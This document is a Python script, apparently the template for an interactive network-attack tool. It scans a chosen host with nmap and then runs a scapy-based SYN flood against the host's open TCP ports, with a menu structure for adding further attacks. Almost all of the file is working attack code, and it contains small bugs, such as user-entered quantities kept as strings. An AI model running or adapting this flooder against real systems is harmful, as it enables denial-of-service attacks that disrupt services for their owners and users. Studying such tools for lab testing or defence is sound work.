'''from scapy.all import *
import nmap
import re

values = {}

interfaces = get_if_list()
if len(interfaces) > 1:
    while True:
        for i, item in enumerate(list(interfaces)[1:],1):
            print("\n", i, '. ' + item, sep='',end='')
        try:
            data = int(input("\n\nWhich Interface? (Enter a Number): "))
            interface_name = interfaces[data]
            break
        except:
            print("\nInvalid input", data)
else:
    interface_name = conf.iface


# Get Source IP Address
source_ip = get_if_addr(interface_name)
values["source_ip"]=source_ip
og_source_ip = source_ip

# Get Source Mac Address
source_mac_address = get_if_hwaddr(interface_name)
values["source_mac_address"]=source_mac_address
og_source_mac_address = source_mac_address

# Get Target IP Address
while True:
    target_ip = input("Enter host IP address: ")
    regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
    if(re.search(regex, target_ip.lower())):
        values["target_ip"]=target_ip
        break
    else:
        print("Invalid IP address\n")

# Get Target MAC Address
nm = nmap.PortScanner()
print("Getting target's information. Please wait...")
nm.scan(target_ip, '0-1023')
target_mac_address = str(nm[target_ip]['addresses']['mac'])
values["target_mac_address"]=target_mac_address

# Get Target Ports
tcp_ports = list(nm[target_ip]['tcp'].keys())
values["tcp_ports"]=tcp_ports

# To test comment out everything above (including the import block) and uncomment the block below
'''
from scapy.all import *
import re
import sys
import random

values = {}
tcp_ports = [80, 22]
values["tcp_ports"]=tcp_ports
target_mac_address = "ff:ff:ff:ff:ff:ff"
values["target_mac_address"]=target_mac_address
og_source_mac_address = "ff:ff:ff:ff:ff:ff"
source_mac_address = "ff:ff:ff:ff:ff:ff"
values["source_mac_address"]=source_mac_address
og_source_ip = "2.2.2.2"
source_ip = "2.2.2.2"
values["source_ip"]=source_ip
target_ip = "1.1.1.1"
values["target_ip"]=target_ip
values["quantity"]=100


# TEMPLATES EXAMPLE   
def syn_flood():
    print("SYN Flood")
    valid_var = ["target_ip", "quantity"]
    help_statement = "\nsends a multitude of SYN packets to attempt to overwhelm the target"
    print("\nRunning SYN Flood attack, please enter the parameters:\n")
    variable_input(valid_var, help_statement)
    all_variables_inputted(valid_var)
    check_var(values, valid_var)
    template = IP(dst=values.get("target_ip"), ttl=99)/TCP(sport=RandShort(), seq=12345, ack=1000, flags="S")
    ns = []
    pktAmt = values.get("quantity")
    for pktNum in range(0,pktAmt):
    	ns.extend(template)
    	ns[pktNum][TCP].dport = random.choice(tcp_ports)
    send(ns)
    print("Packets sent")

# Confirms with user that all the variables are correct
def check_var(values, required_var_list):
    correct = "no"
    while correct != "yes":
        print("")
        for i, (k, v) in enumerate({key: values[key] for key in required_var_list if key in values}.items()):
            print(i, '. ', k, ' is ', v)
        print("")
        correct = input("\nAre all these variables correct (yes/no): ")
        if correct == "yes":
            break
        elif correct == "no":
            new_num = int(input("\nWhich variable do you want to edit? (Enter a number): "))
            try:
                variable = required_var_list[new_num]
                print(f"\n{variable} Selected")
                new_val = input(f"\nEnter the new value for {variable}: ")
                variable_error_handling(variable, new_val)
            except:
                print("\nCould not be found, please try again")
                continue
        else:
            print("\nDid not understand, please try again\n")

# Allows user to input variables in a non-restrictive way
def variable_input(required_variable_list, help_statement):
    user_input = input()
    while user_input != "done":
        if user_input == "quit":
            print("\nExiting script\n")
            quit()
        elif user_input == "help":
            print(help_statement)
            help_func(required_variable_list)
            print("Enter done if everything is set to preference")
            print("")
        elif " = " in user_input:
            variable = user_input.split(" = ")[0]
            var_value =  user_input.split(" = ")[1]
            if variable in required_variable_list:
                variable_error_handling(variable, var_value)
            else:
                print("\nDid not understand, please try again\n")
        else:
            print("\nDid not understand, please try again\n")
        user_input = input()

# Checks to see if the values the user inputted for the variables are valid
def variable_error_handling(variable, var_value):
    if variable == "target_ip":
        print("You are not permitted to change the target IP address\n")

    if variable == "source_ip":
        regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        if(re.search(regex, var_value.lower())):
            values["source_ip"]=var_value
        else:
            print("Invalid IP address\n")
    
    if variable == "target_mac_address":
        print("You are not permitted to change the target MAC address\n")
        
    if variable == "source_mac_address":
        regex = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$"
        if(re.search(regex, var_value.lower())):
            values["source_mac_address"]=var_value.lower()
        else:
            print("Invalid mac address\n")

    if variable == "timeout":
        if var_value.isnumeric():
            values["timeout"]=var_value
        else:
            print("Invalid timeout value\n")

    if variable == "quantity":
        if var_value.isnumeric():
            values["quantity"]=var_value
        else:
            print("Invalid quantity value\n")
            
# Generic help function to give details about the attack/it's requirements
def help_func(required_var_list):
    if "source_ip" in required_var_list:
        print("to enter ip type source_ip = 1.1.1.1, you currently have the target_ip set as", values.get("source_ip"))
    if "target_ip" in required_var_list:
        print("to enter ip type target_ip = 1.1.1.1, you currently have the target_ip set as", values.get("target_ip"))
    if "source_mac_address" in required_var_list:
        print("to enter mac type target_mac_address = ff:ff:ff:ff:ff:ff, you currently have target_mac_address set as", values.get("source_mac_address"))
    if "target_mac_address" in required_var_list:
        print("to enter mac type target_mac_address = ff:ff:ff:ff:ff:ff, you currently have target_mac_address set as", values.get("target_mac_address"))
    if "timeout" in required_var_list:
        print("to enter the timeout value type any number, you currently have the timeout value set as", values.get("timeout"))
    if "quantity" in required_var_list:
        print("to enter the quantity value type any number, you currently have the quantity value set as", values.get("quantity"))  

# Checks to see if all the required variables have been filled
def all_variables_inputted(required_var_list):
    while all(variables in values for variables in required_var_list) is False:
        for variable in list(required_var_list - values.keys()):
            print("\nMissing value(s) for: ",variable)
            variable_value = input(f"Enter the value for {variable}: ")
            variable_error_handling(variable, variable_value)
        all(variables in values for variables in required_var_list)

def reset():
    if og_source_ip != source_ip:
        print("\nReverting IP address\n")
        #change ip address 
    
    if og_source_mac_address != source_mac_address:
        print("\nReverting MAC address\n")
        #change mac address


########## MAIN MENU EXAMPLE ##########

available_templates = {"Attack Name/Explaination":"attack_function_name"}
    
if len(tcp_ports) != 0:
    available_templates["SYN Flood"]=syn_flood

while True:
    for i, item in enumerate(list(available_templates.keys())[1:],1):
        print("\n", i, '. ' + item, sep='',end='')
    try:
        data = int(input("\n\nWhich Attack? (Enter a Number): "))
        available_templates.get(list(available_templates.keys())[data])()
        reset()
        break
    except KeyboardInterrupt:
        print("\nExiting program")
        sys.exit()
    except:
        print("\nInvalid input", data)